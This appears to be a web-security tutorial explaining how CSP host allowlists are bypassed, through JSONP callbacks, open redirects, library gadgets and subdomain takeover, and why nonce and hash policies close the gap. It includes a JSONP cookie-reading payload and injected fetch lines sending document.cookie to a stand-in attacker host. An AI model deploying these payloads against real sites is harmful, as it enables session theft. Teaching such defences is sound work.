CSP Bypass Techniques,
and Why Nonces & Hashes Beat Allowlists

A host-based allowlist like script-src https://cdn.example.com looks airtight on paper. It isn't. CSP checks where a script claims to come from — not whether that source itself can be tricked into serving attacker-controlled content. If any endpoint on an allowlisted host can be turned into a script-shaped response, the allowlist doesn't block the attacker. It vouches for them. This lesson walks through exactly how that happens, and why nonces and hashes close the gap by authenticating the script itself.

00 — Quick Recap

The Allowlist We're About to Break

The companion explainer lesson covered the basic shape of CSP: a header like script-src 'self' https://cdn.jsdelivr.net tells the browser to only execute scripts loaded from those two origins, refusing everything else — including an attacker's injected <script> tag, which has no matching source at all.

That story is true, and it's genuinely useful. But it quietly assumes something: that every origin on the allowlist only ever serves content the site owner actually wrote and controls. This lesson is about what happens when that assumption breaks — and about the two mechanisms, nonces and hashes, that were specifically designed because it breaks more often than people expect.

🎯 The Question This Lesson Answers
CSP's script-src allowlist checks one thing: the origin a script was fetched from. It never inspects what the script actually contains. So the real question an attacker asks isn't "how do I get my script onto the allowlist?" — it's "is there anything, anywhere, on a host that's already on the allowlist, that will return attacker-controlled JavaScript?" On a big enough host, the answer is very often yes.
01 — The Core Weakness

Why Host-Based Allowlisting Is Weaker Than It Looks

Here's the assumption baked into every script-src https://trusted-host.com policy: "I trust this entire host to only ever serve script content I intended." That's a much bigger promise than it sounds like, because a modern host is rarely one thing. It's a whole application, often with:

  • Legacy API endpoints nobody has decommissioned — including old JSONP callback endpoints from an era before CORS was well-supported.
  • User-generated content areas — profile pages, file uploads, sandboxed iframes — that happen to share the same origin as the trusted static assets.
  • Open redirect endpoints (login flows, analytics click-trackers, "continue to" links) that will happily 302 a browser to any URL an attacker supplies.
  • Their own third-party scripts, analytics tags, or ad code — each one another potential injection point that now inherits your trust, not just theirs.
  • Subdomains the "host" nominally covers but the security team doesn't actively audit — a forgotten demo.trusted-host.com pointing at a decommissioned cloud bucket, ripe for takeover.

CSP's allowlist check happens at the origin level — scheme, host, and (if specified) port. It has no concept of "this path is fine, but that path is dangerous." If any URL under an allowlisted origin can be coerced into responding with attacker-controlled JavaScript, that URL is just as trusted as /jquery.min.js was always meant to be. The browser has no way to tell them apart — both requests come back with Content-Type: application/javascript from a host on the list, and CSP's job is already done by the time it checked the origin.

💡 The Mental Model Shift
Stop thinking of script-src as an allowlist of trusted code. It's an allowlist of trusted origins — and "trusted origin" and "every byte ever served from that origin is safe to execute as JavaScript" are very different guarantees. The gap between those two ideas is exactly where every bypass in this lesson lives.
02 — Concrete Bypass #1

The JSONP Bypass, Walked Through

JSONP ("JSON with Padding") is an old workaround from before Cross-Origin Resource Sharing existed. A client wants JSON data from another origin, but the browser's same-origin policy blocks a plain cross-origin fetch. The trick: load the "data" as a <script> tag instead — scripts aren't subject to the same-origin restriction — and have the server wrap the JSON in a function call, using a callback name the client supplies via a query parameter.

a legacy jsonp endpoint// GET https://api.example.com/data?callback=handleData
// server responds with Content-Type: application/javascript

handleData({"user": "bob", "id": 42})

// the client had already defined window.handleData = function(json){...}
// so this "script" just calls their own function with the data

Notice the vulnerability sitting in plain sight: the server takes the callback value straight from the query string and writes it, unescaped, directly before the opening parenthesis of a script response. It was designed to let the client name a function. Nothing stops the client from putting arbitrary JavaScript there instead.

Now imagine a victim site ships this policy, trusting a real API host with a JSONP endpoint it forgot about:

The vulnerable policy Content-Security-Policy: script-src https://api.example.com Looks strict — one specific, presumably-trusted host. It isn't strict enough.
  1. Attacker finds the injection pointSome page on the victim site reflects unescaped user input — the exact kind of gap the companion lesson described. Say a search field.
  2. Attacker crafts a script tag pointing at the trusted host's JSONP endpoint<script src="https://api.example.com/data?callback=alert(document.cookie)//"></script> — the trailing // comments out the rest of the real response so it doesn't cause a syntax error.
  3. Victim's browser checks CSPThe script's origin is https://api.example.com — which is on the allowlist. CSP approves the load without hesitation.
  4. The "trusted" response is actually attacker-controlledThe server dutifully echoes the callback parameter back as executable code: alert(document.cookie)({"user":"bob"...})//... — and the browser runs it.
  5. Full script execution, CSP never violatedNo console error. No blocked-uri report. As far as CSP is concerned, this was a completely ordinary, fully authorized script load from an allowlisted origin.
⚠️ Why This Is So Uncomfortable
This bypass doesn't require finding a second XSS bug on the victim site beyond the original injection point. It doesn't require compromising api.example.com either — that host is doing exactly what it was built to do. The vulnerability is structural: CSP vouched for an origin, and that origin had a feature that turns user input into executable code. The allowlist did its job perfectly and the attacker still won.
03 — More Ways In

Other "Trusted Origin, Untrusted Content" Bypasses

JSONP is the classic teaching example, but it's one instance of a broader pattern. Anywhere a trusted origin will echo attacker-influenced content back as (or leading to) executable script, the allowlist stops mattering.

Bypass ClassVulnerable Policy ExampleHow It's Abused
JSONP reflectionscript-src https://api.example.comCallback parameter reflected unescaped into a script response — attacker supplies JS instead of a function name.
Open redirectscript-src https://trusted.comtrusted.com/go?url=evil.com/x.js 302-redirects to attacker infrastructure; the browser follows it, and the initial request's origin was on the allowlist.
Angular/library gadgetscript-src https://cdn.example.comAn old, allowlisted library version hosted on that CDN has its own known XSS/sandbox-escape bug — attackers load the vulnerable old version instead of the current one.
Wildcard subdomainscript-src *.example.comAttacker takes over an expired or misconfigured subdomain (dangling DNS, abandoned cloud bucket) and serves a payload from it — fully within the wildcard.
Upload / user-content pathscript-src https://static.example.comThe same host also serves user-uploaded files under a path with a permissive Content-Type — attacker uploads a ".js"-servable payload.
'unsafe-inline' presentscript-src 'self' 'unsafe-inline'Not really a bypass at all — it simply un-does CSP's script protection outright, allowing any injected inline script to run.

Notice the pattern across every row except the last: none of these require breaking CSP's enforcement logic. The browser is checking the allowlist correctly, every time. The failure is entirely in what the allowlist was asked to trust in the first place — an origin, treated as a single unit of trust, when in reality it's a whole application surface with its own bugs, features, and forgotten corners.

Real-world footnote. Google's own www.google.com has historically had JSONP-style and open-redirect endpoints documented as CSP bypass vectors in security research — precisely because it's exactly the kind of large, historically deep, feature-rich host that ends up on a great many allowlists. Being a huge, reputable, well-secured company doesn't shrink the attack surface of "every endpoint we've ever shipped."
04 — The Fix, Part One

Nonce-Based CSP: Authenticate the Script, Not the Host

A nonce ("number used once") flips the entire question CSP asks. Instead of "did this script come from a host I trust," the policy asks: "does this script carry a secret token that only my own server could have handed out for this exact page load?" Origin becomes irrelevant. What matters is possession of a value an attacker has no way to guess or observe in advance.

  1. Server generates a fresh random value, per responseA cryptographically random value — typically 128 bits, base64-encoded — generated fresh on every single page render. Never reused, never predictable, never derived from anything an attacker could compute.
  2. The nonce goes into the CSP headerContent-Security-Policy: script-src 'nonce-r4nd0mBase64Value' — this is the value the browser will check every script tag against for this document.
  3. The same nonce goes onto every legitimate <script> tagThe server's templating layer stamps the identical value onto each script tag it renders: <script nonce="r4nd0mBase64Value" src="/app.js"></script>.
  4. Browser checks the attribute, not the originFor every script the page tries to run, the browser checks: does its nonce attribute exactly match the value in the CSP header? If yes, it runs — origin doesn't matter at all anymore for nonce-covered policies. If no (or missing), it's blocked, full stop.
  5. An injected script has no way to know the nonceThe attacker's payload lands in the HTML the same way it always did. But they were never handed this page load's nonce — it's generated fresh, server-side, and never exposed anywhere an injected script could read it before it needs to declare its own (nonexistent) matching attribute.
nonce-based csp in practice// Response header (fresh value every single response):
Content-Security-Policy: script-src 'nonce-8f4A2xQ9pLk3vR7z' 'strict-dynamic';

// Legitimate script tag, stamped by the server template:
<script nonce="8f4A2xQ9pLk3vR7z" src="/app.js"></script>
// → ALLOWED: nonce attribute matches the header value exactly.

// Attacker's injected payload, landed via an unrelated escaping bug:
<script>fetch('https://evil.example/steal?c='+document.cookie)</script>
// → BLOCKED: no nonce attribute at all. The attacker had no way to
//   learn "8f4A2xQ9pLk3vR7z" — it didn't exist until this exact response.
🔑 strict-dynamic: The Companion Keyword
Modern apps often load scripts dynamically — a nonce-carrying script that itself injects a second <script> tag at runtime (a common bundler/module-loader pattern). Adding 'strict-dynamic' to the policy says: "any script with a valid nonce is trusted to load further scripts, and those child scripts inherit that trust — but plain origin allowlists are now ignored entirely." This is what closes the JSONP and open-redirect bypasses outright: strict-dynamic means an origin being on some legacy allowlist entry no longer grants anything.
⚠️ Nonces Only Work If The Randomness Is Real
A nonce that's predictable, reused across requests, or derived from something guessable (a timestamp, a sequential counter, a value also leaked elsewhere on the page) collapses back to a static allowlist an attacker can eventually satisfy. It must be generated fresh per HTTP response with a cryptographically secure random source, and never logged, cached, or exposed anywhere an attacker could read it ahead of time.
05 — The Fix, Part Two

Hash-Based CSP: Authenticate the Content Itself

A hash-based policy takes the same "trust the script, not the source" idea and applies it somewhere nonces don't fit well: static inline scripts that never change between page loads. Instead of a per-request random token, the CSP header lists the exact cryptographic hash of each allowed inline script's content.

hash-based csp in practice// The inline script, byte-for-byte, exactly as it appears in the HTML:
<script>var x = 1;</script>

// SHA-256 of the exact contents between the tags: "var x = 1;"
// (including whitespace — this must match byte-for-byte)
Content-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG+HiZ1guq6ZZDob/Tng=';

// The browser computes the SHA-256 hash of every inline script it
// encounters and checks it against the allowed hash list. Only an
// EXACT content match — down to the whitespace — is permitted.

The security property is the same one nonces provide, arrived at differently: an attacker's injected script has different content than any of the pre-approved scripts (that's the whole point of injecting something new), so it will never produce a hash that matches an entry in the allowlist. There's no token to steal or predict — the content itself is the credential, and the attacker can't forge a hash collision on demand with any algorithm CSP actually supports (SHA-256, SHA-384, SHA-512).

✅ Good Fit For Hashes

Static inline scripts that never change between deploys — a small bootstrap snippet, a fixed analytics init block, a JSON-LD structured-data script. Compute once at build time, ship the hash alongside the code.

⚠️ Poor Fit For Hashes

Inline scripts whose content is dynamically generated per request — say, one that embeds a server-rendered user ID or CSRF token inline. Every distinct rendered value produces a different hash, so hashes don't scale here; nonces (which cover the whole tag regardless of content) are the better tool.
Whitespace matters — literally. Hash-based CSP hashes the exact text content of the script element, character for character. A trailing newline added by a linter, a minifier that changes whitespace, or a templating engine that reformats output between builds will silently change the hash and break the policy (fail closed — the script gets blocked, not silently allowed). This is a common source of "CSP broke my app after a routine deploy" bug reports.

Watch what happens when an attacker tries to reuse a hash that was meant for something else entirely — this is exactly why "exact content match" is such a strong guarantee:

why attackers can't forge a hash// Allowed by policy: 'sha256-qznLcsROx4GACP2dm0UCKCzCG+HiZ1guq6ZZDob/Tng='
// which is SHA-256("var x = 1;")

// Attacker's injected script has DIFFERENT content:
<script>fetch('https://evil.example?c='+document.cookie)</script>
// SHA-256 of THIS content is a completely different, unrelated hash —
// not "close", not "similar" — cryptographically unrelated.
// It will never appear in the policy's allowlist unless the site
// owner explicitly added it, which they would only do for code
// they wrote and reviewed themselves.
// → BLOCKED, same as if it had no hash at all.

07 — The Full Picture

Allowlist vs. Nonce vs. Hash

All three are valid script-src source expressions. They are not, however, equally strong — and the reason is always the same underlying idea: the first authenticates a location; the other two authenticate the script itself.

🌐 Host Allowlist

script-src https://cdn.example.com

Trusts anything served from that origin, forever, regardless of content. Vulnerable to JSONP reflection, open redirects, vulnerable library versions, subdomain takeover, and any other "trusted origin, untrusted content" gap on that host.

🔑 Nonce

script-src 'nonce-RANDOM'

Trusts any script tag carrying a per-response secret token, regardless of origin. Works well for both static and dynamically-generated scripts. Requires server-side templating support and truly fresh randomness every response.

🔒 Hash

script-src 'sha256-HASH'

Trusts scripts whose exact byte content matches a precomputed value, regardless of origin or timing. No server-side per-request logic needed at all — but only practical for content that's fixed at build time.

✅ The One-Sentence Summary
A host allowlist asks "did this come from somewhere I trust," which an attacker can satisfy by finding any exploitable feature on that host — but a nonce or hash asks "is this the exact script I meant to run," a question an attacker can't answer correctly no matter which origin they attack from.
08 — Quick Reference

Glossary & Key Terms

Host Allowlist
A script-src value naming an origin — trusts anything served from that origin, regardless of content, making it as strong as the weakest endpoint on that host.
JSONP Bypass
Abusing a legacy JSONP endpoint's unescaped callback parameter to turn an allowlisted host into a source of attacker-controlled JavaScript.
Open Redirect Bypass
Using an allowlisted host's own redirect endpoint to have the browser's initial (trusted-origin) request end up fetching a script from attacker infrastructure.
Nonce
A random, single-use, per-response token embedded in both the CSP header and a script tag's nonce attribute — only scripts carrying the exact match execute.
Hash-Based CSP
A source expression naming the exact cryptographic hash (SHA-256/384/512) of an allowed inline script's content — any different content produces a different hash and is blocked.
strict-dynamic
A script-src keyword that extends trust from a nonce/hash-verified script to scripts it dynamically loads, while making plain origin allowlists irrelevant.
Subdomain Takeover
Registering or claiming an abandoned subdomain (expired DNS, orphaned cloud bucket) that a wildcard CSP entry still trusts, turning it into an attacker-controlled origin.
Fail Closed
The security property that a mismatch (wrong nonce, wrong hash, unlisted origin) results in the resource being blocked by default, not silently allowed.
'unsafe-inline'
A script-src keyword that permits all inline scripts unconditionally — effectively disabling CSP's script protection rather than narrowing it.
Gadget Bypass
Exploiting an existing, allowlisted script's own bug (an unsafe eval, a JSONP-like reflection) as a stepping stone to executing attacker-chosen code within the policy's trust.
Content-Type Sniffing
A browser guessing a resource's type from its content rather than trusting the declared header — historically another way an "image upload" endpoint could be coerced into serving executable script.
CSP Level 3
The specification version that introduced strict-dynamic and formalized nonce/hash precedence over plain host expressions — the recommended baseline for any new policy.

Every bypass in this lesson shares one root cause: an allowlist authenticates a place, and places are bigger and messier than they look from the outside. Nonces and hashes sidestep that entire category of problem by authenticating something an attacker can never possess no matter which origin, endpoint, or forgotten subdomain they find.
